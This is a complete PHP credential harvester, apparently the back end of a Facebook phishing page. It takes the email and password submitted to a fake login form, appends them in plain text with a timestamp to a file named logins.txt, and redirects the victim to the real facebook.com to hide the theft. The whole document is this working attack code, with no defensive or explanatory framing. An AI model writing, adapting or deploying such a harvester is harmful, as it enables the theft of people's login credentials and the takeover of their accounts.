<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];


    $file = fopen("logins.txt", "a");
    if ($file) {
        $log_entry = "Email: " . $email . " | Password: " . $password . " | Time: " . date("Y-m-d H:i:s") . "\n";
        fwrite($file, $log_entry);
        fclose($file);
    }

    header("Location: https://www.facebook.com");
    exit();
}
?>